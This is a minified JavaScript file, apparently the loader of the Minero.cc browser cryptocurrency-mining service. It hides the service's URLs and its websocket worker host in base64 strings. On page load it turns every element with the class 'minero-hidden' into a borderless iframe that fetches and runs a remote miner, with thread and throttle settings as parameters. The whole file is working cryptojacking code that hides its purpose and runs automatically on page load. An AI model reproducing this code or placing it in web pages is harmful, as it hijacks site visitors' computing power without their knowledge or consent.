
self.Minero = self.Minero || {}, self.Minero.CONFIG = {
	LIB_URL: atob("aHR0cHM6Ly9taW5lcm8uY2MvbGliLw=="),
	MINER_URL: atob("aHR0cHM6Ly9taW5lcm8uY2MvaHRtbC9taW5lci5odG1s"),
	BLANK_MINER_URL: atob("aHR0cHM6Ly9taW5lcm8uY2MvaHRtbC9ibGFuay1taW5lci5odG1s"),
	WEBSOCKET_SHARDS: [
		[atob("d3NzOi8vd29ya2VyLm1pbmVyby5jYw==")]
	],
	DONATE_WIDGET_URL: atob("aHR0cHM6Ly9taW5lcm8uY2Mvd2lkZ2V0L2RvbmF0ZQ==")
},
function(e) {
	"use strict";

	function i(e) {
		var t = (this.div = e).dataset,
			i = Minero.CONFIG.BLANK_MINER_URL + "?key=" + t.key + "&user=" + encodeURIComponent(t.user || "") + "&throttle=" + (t.throttle || "") + "&threads=" + (t.threads || "");
		this.div.innerHTML = "", this.iframe = document.createElement("iframe"), this.iframe.style.width = "100%", this.iframe.style.height = "100%", this.iframe.style.border = "none", this.iframe.src = i, this.div.appendChild(this.iframe)
	}
	i.CreateElements = function() {
		for (var e = document.querySelectorAll(".minero-hidden"), t = 0; t < e.length; t++) new i(e[t])
	}, "complete" === document.readyState || "interactive" === document.readyState ? i.CreateElements() : document.addEventListener("readystatechange", function() {
		"interactive" === document.readyState && i.CreateElements()
	}), e.Minero = e.Minero || {}, e.Minero.Miner = i
}(window);